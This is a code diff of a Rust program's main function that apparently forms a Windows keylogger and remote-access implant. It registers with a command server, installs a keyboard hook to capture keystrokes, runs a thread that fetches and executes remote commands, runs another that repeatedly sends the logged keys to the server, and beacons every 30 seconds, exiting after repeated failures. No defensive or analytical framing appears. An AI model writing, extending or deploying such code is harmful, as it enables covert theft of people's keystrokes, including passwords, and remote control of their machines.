@@ -21,66 +21,69 @@ macro_rules! unwrap_or_panic {
 #[tokio::main]
 async fn main() {
     const URL: &'static str  = "http://127.0.0.1:5000";
-
-    // let mut enc = encode::Encode::new(52);
-    
-    // let test = "HIII";
-    
-    // // let enc_string = enc.encrypt(&test);
-
-    // // let enc_string =  &enc_string;
-
-    // let array: [& str; 4] = ["Ug==","bw==", "bg==", "7Q=="];
-
-    // for a in array{
-    //     let dec_string = enc.decrypt(a);
-    //     println!("Dec: {}", dec_string);
-
-    // }
-        
-    // println!("Org: {}", &test);
-    // println!("Enc: {:#?}", &enc_string);
     
     
     let server = Arc::new(server::Connection::new(&URL));
 
     let arch = get_windows_version();
 
+    let mut counter = 0;
+
     let id: String = unwrap_or_panic!(server.register(arch).await);
 
-    let server_clone = Arc::clone(&server);
-    let id_clone = id.clone();
+    let server_for_beconing = Arc::clone(&server);
+    let id_beconing = id.clone();
 
+    let server_for_exfil = Arc::clone(&server);
+    let id_exfil = id.clone();
+
+    let server_for_command =  Arc::clone(&server);
+    let id_command = id.clone();
+
+    //Create Thread for listenining on user key strokes
     tokio::spawn(async move {
 
         unsafe {
             set_windows_hook();
         }
-
-        loop{
-            
-        }
     });
 
+    //Create Thread for executing commands
     tokio::spawn(async move {
 
         loop {
-            server_clone.becon(&id_clone).await;
-            sleep(Duration::from_secs(20)).await; 
+     
+            let rec = unwrap_or_panic!(server_for_command.get_command(&id_command).await);
+            execute_command(&rec).await; 
+            sleep(Duration::from_secs(10)).await;
+
         }
     });
 
-    loop{
-        // Execute Commands
-        let rec = unwrap_or_panic!(server.get_command(&id).await);
-        execute_command(&rec).await; 
+    //Create thread for exfiltrating key strokes
+    tokio::spawn(async move {
 
-        //read file and
-        let keys = read_file();
-        let result = server.send_data(&id, &keys.clone()).await;
-        
-        sleep(Duration::from_secs(10)).await;
-        
+        loop {
+                let keys = read_file();
+                let result = server_for_exfil.send_data(&id_exfil, &keys.clone()).await;
+                sleep(Duration::from_secs(10)).await;
+            }
+    });
+
+    //main loop for beconing
+    loop{
+
+        match server_for_beconing.becon(&id_beconing).await{
+
+            Ok(_) => {counter = 0;},
+            Err(_) => {counter += 1;}
+        };
+
+        if counter >= 2 {
+
+            std::process::exit(1)
+        }
+        sleep(Duration::from_secs(30)).await; 
 
     }
     
